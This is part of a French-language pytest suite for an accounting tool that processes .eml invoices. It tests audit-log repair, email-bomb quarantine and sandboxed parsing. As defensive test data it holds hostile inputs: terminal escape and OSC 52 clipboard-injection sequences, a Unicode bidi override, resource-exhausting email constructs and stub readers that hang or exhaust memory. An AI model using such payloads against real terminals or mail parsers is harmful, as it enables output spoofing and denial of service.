    assert (r.brouillons_crees, r.propositions, r.quarantaine, r.messages_lus) == (2, 1, 1, 1)
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert q["nom_fichier"] == "0-bombe.eml"
    assert q["empreinte"] == hashlib.sha256(bombe).hexdigest()
    assert "RecursionError" in q["raison"] and "Traceback" not in q["raison"]
    r2 = lancer(entree, inst, J0)                                 # retente, journalise une seule fois
    assert r2.quarantaine == 1 and len(lire_csv(inst.sortie / "quarantaine.csv")) == 1
    assert actions_audit(inst).count("eml_quarantaine") == 1
    assert JournalAudit(inst.audit).verifier().ok
    (inst.entrant / "0-bombe.eml").unlink()                       # retire par un humain
    lancer(entree, inst, J0)
    assert lire_csv(inst.sortie / "quarantaine.csv") == []


def test_journal_tronque_refus_avant_toute_ecriture_puis_reparation(entree, tmp_path, capsys):
    entree1 = ecrire_entree(tmp_path / "e1", operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree1, inst, J0)
    fragment = b'{"acteur":"systeme","action":"pie'                # coupure pendant une ecriture
    with open(inst.audit, "ab") as f:
        f.write(fragment)
    avant = etat_depot(inst)
    with pytest.raises(cycle.JournalNonSain, match="reparer-audit"):
        lancer(entree, inst, jour(1))                             # 5 nouvelles pieces : aucune ecrite
    b = cycle.brouillons(inst)[0]
    with pytest.raises(cycle.JournalNonSain):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(jour(1)))
    with pytest.raises(cycle.JournalNonSain):
        cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="x", maintenant=a_10h(jour(1)))
    assert etat_depot(inst) == avant
    assert cycle.exporter(inst, tmp_path / "secours.json").exists()   # lecture toujours possible

    assert cli(capsys, inst, "reparer-audit", "--par", "Mallory", date=jour(1))[0] == 1
    assert inst.audit.read_bytes().endswith(fragment)
    rc, out, _ = cli(capsys, inst, "reparer-audit", "--par", "paul martin", date=jour(1))
    assert rc == 0 and f"{len(fragment)} octet(s)" in out
    (sauvegarde,) = inst.racine.glob("audit.jsonl.fragment-*")
    assert sauvegarde.read_bytes() == fragment
    derniere = JournalAudit(inst.audit).lire()[-1]
    assert (derniere.action, derniere.acteur) == ("journal_repare", "Paul Martin")
    assert derniere.details["octets_retires"] == len(fragment)
    assert derniere.details["fragment"] == sauvegarde.name
    assert cycle.verifier_audit(inst).ok
    rc, out, _ = cli(capsys, inst, "reparer-audit", "--par", VALIDEUSE, date=jour(1))
    assert rc == 0 and "rien a reparer" in out and actions_audit(inst).count("journal_repare") == 1
    assert lancer(entree, inst, jour(1)).pieces_creees == 4


def test_journal_altere_au_milieu_reparation_refusee(entree, inst, capsys):
    lancer(entree, inst, J0)
    lignes = inst.audit.read_bytes().split(b"\n")
    lignes[1] = lignes[1].replace(b"ALPHA", b"ALFA", 1)
    altere = b"\n".join(lignes)
    inst.audit.write_bytes(altere)
    from rapprochement.audit import JournalCorrompu
    with pytest.raises(JournalCorrompu):
        cycle.reparer_audit(inst, VALIDEUSE, maintenant=a_10h(J0))
    rc, _, err = cli(capsys, inst, "reparer-audit", "--par", VALIDEUSE)
    assert rc == 1 and "REFUS (JournalCorrompu)" in err and "reparation refusee" in err
    assert inst.audit.read_bytes() == altere and not list(inst.racine.glob("audit.jsonl.fragment-*"))
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "JournalNonSain" in err


def test_validateurs_bom_crlf_commentaires(tmp_path):
    inst = nouvelle_instance(tmp_path / "i", validateurs=None)
    inst.validateurs.write_bytes("﻿Marie Durand\r\n\r\n# ancien : Jean\r\n  Paul Martin  \r\n".encode())
    assert cycle.lire_validateurs(inst) == ("Marie Durand", "Paul Martin")
    assert cycle.exiger_validateur(inst, "marie durand") == "Marie Durand"
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_validateur(inst, "# ancien : Jean")
    inst.validateurs.write_bytes("H\xe9l\xe8ne\n".encode("latin-1"))
    with pytest.raises(cycle.ValidateurRefuse, match="illisible"):
        cycle.exiger_validateur(inst, "Hélène")


def test_cli_neutralise_les_sequences_d_echappement(tmp_path, capsys):
    entree = ecrire_entree(tmp_path / "e", operations=[
        ["ALPHA", "2026-09-03", "CB LOXAM \x1b[2J\x1b]52;c;ZXZpbA==\x07", "120.00", "A-001"]])
    inst = nouvelle_instance(tmp_path / "i")
    e = ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@evil.example", message_id="<x@y>",
                   fichiers=(("f.pdf", b"%PDF"),))
    e.write_bytes(e.read_bytes().replace(b"Message-ID: <x@y>",
                                         b"Message-ID: \x1b[1A\x1b[2K\x1b[1A\x1b[2Kcache"))
    lancer(entree, inst, J0)
    cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="litige \x1b[31mrouge‮",
                        maintenant=a_10h(J0))
    sorties = []
    for commande in ("file", "pieces"):
        rc, out, err = cli(capsys, inst, commande)
        assert rc == 0
        sorties.append(out + err)
    rc, out, err = cli(capsys, inst, "rattacher", "--message-id", "\x1b[2Kcache", "--par", VALIDEUSE)
    assert rc == 1
    sorties.append(out + err)
    rc, out, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    sorties.append(out + err)
    tout = "".join(sorties)
    assert "\x1b" not in tout and "\x07" not in tout and "‮" not in tout
    assert "cache" in sorties[0] and "\\x1b" in sorties[0]
    assert "litige \\x1b[31mrouge\\u202e" in sorties[1]           # motif visible, inerte


def test_rattacher_leve_le_blocage_du_cycle_jamais_un_blocage_manuel(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    entree2 = ecrire_entree(tmp_path / "e2", pieces=[
        ["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR", "2026-10-06", "email"],
    ])
    lancer(entree2, inst, jour(7))                                # le moteur retrouve A-002 : bloquee
    assert pieces_par_ref(inst)["A-002"].motif_blocage.startswith(cycle.PREFIXE_MOTIF_CYCLE)
    cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="Litige avec le loueur",
                        maintenant=a_10h(jour(7)))
    n = len(JournalAudit(inst.audit).lire())
    m = a_10h(jour(7))

    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=m, dossier="ALPHA", reference="A-002",
                              id_piece="P-77")
    assert p.etat is EtatPiece.RECUE and not p.bloquee
    nouvelles = JournalAudit(inst.audit).lire()[n:]
    assert [e.details.get("evenement") for e in nouvelles if e.action == "transition"] == [
        "piece_rattachee", "blocage_leve"]
    assert cycle.controler_piece(inst, "ALPHA", "A-002", VALIDEUSE, conforme=True,
                                 maintenant=m).etat is EtatPiece.VALIDEE

    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=m, dossier="ALPHA", reference="A-001",
                              id_piece="P-loxam")
    assert p.etat is EtatPiece.RECUE and p.bloquee and p.motif_blocage == "Litige avec le loueur"
    with pytest.raises(etats.TransitionInterdite, match="bloquee"):
        cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=True, maintenant=m)
    cycle.debloquer_piece(inst, "ALPHA", "A-001", "Paul Martin", motif="litige clos", maintenant=m)
    assert cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=True,
                                 maintenant=m).etat is EtatPiece.VALIDEE


# ---------------------------------------------------------------------------
# Gardes de taille avant analyse d'un .eml, et entrees malformees
# ---------------------------------------------------------------------------


def _eml_avec_from(taille_en_tete: int, message_id: str) -> bytes:
    mots = b"=?utf-8?q?a?= " * (taille_en_tete // 14)
    return (b"From: " + mots + b"<a@b.fr>\r\nMessage-ID: <" + message_id.encode()
            + b">\r\n\r\nx\r\n")


def test_eml_gros_corps_en_tetes_normaux_passe(entree, inst):
    e = ecrire_eml(inst.entrant, "1.eml", expediteur="compta@alpha-sarl.fr", message_id="<g@a>",
                   corps="120,00 EUR\n" + "texte de remplissage " * 5000,
                   fichiers=(("loxam_2026-09-03.pdf", b"%PDF" + b"0" * 100_000),))
    assert e.stat().st_size > 100_000
    r = lancer(entree, inst, J0)
    assert (r.propositions, r.quarantaine) == (1, 0)


def test_bloc_d_en_tetes_de_70_kio_en_quarantaine_sans_analyse(entree, inst, monkeypatch):
    brut = _eml_avec_from(70 * 1024, "lourd@x")
    assert brut.index(b"\r\n\r\n") > cycle.TAILLE_MAX_EN_TETES_EML
    (inst.entrant / "lourd.eml").write_bytes(brut)
    ecrire_eml(inst.entrant, "ok.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@a>",
               corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
    analyses = []                                                 # cote parent : appels d'analyse
    original = cycle._lire_eml_isole
    monkeypatch.setattr(cycle, "_lire_eml_isole", lambda chemin, *a: analyses.append(chemin.name)
                        or original(chemin, *a))
    t = time.perf_counter()
    r = lancer(entree, inst, J0)
    duree = time.perf_counter() - t
    assert duree < 1.0, duree
    assert analyses == ["ok.eml"]                                 # l'analyseur n'a jamais vu le fichier
    assert (r.quarantaine, r.propositions) == (1, 1)
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert q["nom_fichier"] == "lourd.eml" and q["empreinte"] == hashlib.sha256(brut).hexdigest()
    assert q["raison"].startswith("EmlRefuse : bloc d'en-tetes de") and "Traceback" not in q["raison"]
    assert actions_audit(inst).count("eml_quarantaine") == 1


def test_bloc_d_en_tetes_juste_sous_le_seuil_analyse(entree, inst):
    (inst.entrant / "limite.eml").write_bytes(_eml_avec_from(32 * 1024, "limite@x"))
    r = lancer(entree, inst, J0)
    assert r.quarantaine == 0 and r.messages_lus == 1


def test_fichier_de_31_mio_refuse_sans_analyse(entree, inst, monkeypatch):
    gros = inst.entrant / "gros.eml"
    with open(gros, "wb") as f:
        f.write(b"From: a@b.fr\r\nMessage-ID: <gros@x>\r\n\r\n")
        f.truncate(31 * 1024 * 1024)
    monkeypatch.setattr(cycle, "_lire_eml_isole", lambda *a: pytest.fail("analyse interdite"))
    r = lancer(entree, inst, J0)
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert r.quarantaine == 1 and q["raison"].startswith("EmlRefuse : fichier de 32505856 octets")


@pytest.mark.parametrize("domaines", ["client a.fr", "jean@client-a.fr", "localhost"])
def test_domaines_malformes_refus_lisible_sans_ecriture(tmp_path, capsys, domaines):
    entree = ecrire_entree(tmp_path / "e")
    with open(entree / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact", "jour_echeance_tva",
                    "ton_relance", "circuit", "email_relais", "domaines"])
        w.writerow([*DOSSIERS[0], domaines])
    inst = cycle.Instance(tmp_path / "i")                         # instance neuve, rien sur disque
    rc, out, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1
    assert "REFUS [cycle]" in err and "domaine" in err and "dossiers.csv" in err
    assert not inst.depot.exists() and not inst.audit.exists()


def test_entrees_illisibles_refus_lisible(tmp_path, capsys, inst):
    entree = ecrire_entree(tmp_path / "e")
    lancer(entree, inst, J0)
    avant, audit_avant = etat_depot(inst), inst.audit.read_bytes()
    (entree / "releve_bancaire.csv").write_text(
        "dossier,date_operation,libelle,debit,credit,reference\nALPHA,31/02/2026,\x1b[2J,1,,R\n",
        encoding="utf-8")
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "REFUS [cycle]" in err and "releve_bancaire.csv" in err and "\x1b" not in err
    (entree / "releve_bancaire.csv").unlink()
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "introuvable" in err
    assert etat_depot(inst) == avant and inst.audit.read_bytes() == audit_avant


# ---------------------------------------------------------------------------
# Lecture isolee des .eml dans un processus enfant borne
# ---------------------------------------------------------------------------

import multiprocessing  # noqa: E402
import resource  # noqa: E402

MEMOIRE_TEST = 256 * 1024 ** 2
CPU_TEST = 2


def _mots(n: int) -> bytes:
    return b"=?utf-8?q?a?= " * n


def _partie_nom_encode(n: int, mid: str) -> bytes:
    return (b"From: inconnu@evil.example\r\nMessage-ID: <" + mid.encode() + b">\r\nMIME-Version: 1.0\r\n"
            b"Content-Type: multipart/mixed; boundary=b\r\n\r\n--b\r\n"
            b"Content-Type: application/pdf; name=\"" + _mots(n).strip() + b"\"\r\n\r\nPDF\r\n--b--\r\n")


def _enfants_vivants() -> list[str]:
    vivants = [str(p.pid) for p in multiprocessing.active_children()]
    for fichier in Path("/proc/self/task").glob("*/children"):
        vivants += fichier.read_text().split()
    return vivants


def _rss_parent_ko() -> int:
    return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss


def lancer_borne(entree: Path, inst: cycle.Instance, d: dt.date = J0) -> cycle.ResumeCycle:
    return cycle.executer_cycle(entree, inst, d, a_10h(d), limite_memoire_eml=MEMOIRE_TEST,
                                limite_cpu_eml=CPU_TEST)


def test_attaques_mesurees_en_quarantaine_le_reste_du_lot_traite(entree, inst):
    attaques = {
        "a-partie-109k.eml": _partie_nom_encode(8000, "p109@x"),
        "b-partie-218k.eml": _partie_nom_encode(16000, "p218@x"),
        "c-imbrique-1000.eml": _imbrique(1000),
    }
    for nom, brut in attaques.items():
        (inst.entrant / nom).write_bytes(brut)
    ecrire_eml(inst.entrant, "y-ok.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@a>",
               corps="Montant 120,00 EUR",
               fichiers=(("loxam_2026-09-03.pdf", b"%PDF-1"), ("annexe.pdf", b"%PDF-2"),
                         ("photo.jpg", b"\xff\xd8\xff")))                 # legitime, 3 pieces jointes
    ecrire_eml(inst.entrant, "z-ok.eml", expediteur="contact@beta-sas.fr", message_id="<ok@b>",
               fichiers=(("metro.pdf", b"%PDF-3"),))
    rss_avant = _rss_parent_ko()
    t = time.perf_counter()
    r = lancer_borne(entree, inst)
    duree = time.perf_counter() - t
    assert duree < 8.0, duree
    assert _rss_parent_ko() - rss_avant < 100 * 1024                 # < 100 Mo (sans isolation : +465 Mo a +1,8 Go)
    quarantaine = {q["nom_fichier"]: q["raison"] for q in lire_csv(inst.sortie / "quarantaine.csv")}
    assert set(quarantaine) == set(attaques)
    assert "MemoryError" in quarantaine["a-partie-109k.eml"]
    assert "RecursionError" in quarantaine["c-imbrique-1000.eml"]
    assert all("Traceback" not in raison for raison in quarantaine.values())
    assert r.messages_lus == 2 and r.propositions == 1 and r.brouillons_crees == 2
    file = cycle.lister_file(inst)
    assert len([d for d in file if d.message_id == "<ok@a>"]) == 3   # une decision par piece jointe
    assert _enfants_vivants() == []


@pytest.mark.parametrize("n", [8000, 16000])                         # 112 Ko puis 224 Ko
def test_from_quadratique_borne_meme_sans_le_premier_filtre(entree, inst, monkeypatch, n):
    monkeypatch.setattr(cycle, "TAILLE_MAX_EN_TETES_EML", 10 * 1024 * 1024)   # 2e ligne de defense seule
    (inst.entrant / "lourd.eml").write_bytes(
        b"From: " + _mots(n) + b"<a@b.fr>\r\nMessage-ID: <lourd@x>\r\n\r\nx\r\n")
    ecrire_eml(inst.entrant, "ok.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@a>",
               corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
    rss_avant = _rss_parent_ko()
    t = time.perf_counter()
    r = lancer_borne(entree, inst)
    assert time.perf_counter() - t < 5.0
    assert _rss_parent_ko() - rss_avant < 100 * 1024
    assert r.propositions == 1
    lourd = [d for d in cycle.lister_file(inst) if d.message_id == "<lourd@x>"]
    en_quarantaine = [q for q in lire_csv(inst.sortie / "quarantaine.csv") if q["nom_fichier"] == "lourd.eml"]
    assert en_quarantaine or (lourd and all(d.dossier is None for d in lourd))   # jamais route
    assert _enfants_vivants() == []


@pytest.mark.xfail(strict=True, reason=(
    "routage._expediteur intercepte `Exception`, donc aussi MemoryError : sous la borne memoire "
    "de la lecture isolee, l'en-tete From quadratique n'est pas mis en quarantaine mais lu comme "
    "un expediteur vide (DOSSIER_INCONNU, file humaine). Sans danger pour le routage, mais "
    "l'epuisement de ressources est deguise en en-tete malforme."))
def test_defaut_routage_avale_memoryerror_de_l_en_tete_from(entree, inst, monkeypatch):
    monkeypatch.setattr(cycle, "TAILLE_MAX_EN_TETES_EML", 10 * 1024 * 1024)
    (inst.entrant / "lourd.eml").write_bytes(
        b"From: " + _mots(8000) + b"<a@b.fr>\r\nMessage-ID: <lourd@x>\r\n\r\nx\r\n")
    lancer_borne(entree, inst)
    assert [q["nom_fichier"] for q in lire_csv(inst.sortie / "quarantaine.csv")] == ["lourd.eml"]


@pytest.mark.parametrize("comportement, attendu", [
    ("boucle", "SIGXCPU"),
    ("sommeil", "interrompue"),
    ("memoire", "MemoryError"),
    ("sortie", "code de sortie 3"),
])
def test_lecture_isolee_chaque_echec_devient_une_quarantaine(entree, inst, monkeypatch,
                                                           comportement, attendu):
    from rapprochement import routage

    def lecteur_hostile(chemin):
        if comportement == "boucle":
            while True:
                pass
        if comportement == "sommeil":
            time.sleep(60)
        if comportement == "memoire":
            return bytearray(4 * 1024 ** 3)
        os._exit(3)

    monkeypatch.setattr(cycle, "MARGE_GARDE_LECTURE_EML", 0.5)
    monkeypatch.setattr(routage, "lire_eml", lecteur_hostile)      # herite par l'enfant (fork)
    ecrire_eml(inst.entrant, "1.eml", expediteur="compta@alpha-sarl.fr", message_id="<h@a>",
               fichiers=(("f.pdf", b"%PDF"),))
    t = time.perf_counter()
    r = cycle.executer_cycle(entree, inst, J0, a_10h(J0), limite_memoire_eml=MEMOIRE_TEST,
                             limite_cpu_eml=1)
    assert time.perf_counter() - t < 4.0
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert attendu in q["raison"] and "Traceback" not in q["raison"], q["raison"]
    assert r.quarantaine == 1 and r.brouillons_crees == 2
    assert _enfants_vivants() == []


def test_sans_module_resource_refus_explicite(entree, inst, monkeypatch, capsys):
    monkeypatch.setattr(cycle, "resource", None)
    with pytest.raises(cycle.IsolationIndisponible, match="Linux ou macOS"):
        lancer(entree, inst, J0)
    assert not inst.depot.exists()
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "IsolationIndisponible" in err and "Linux ou macOS" in err
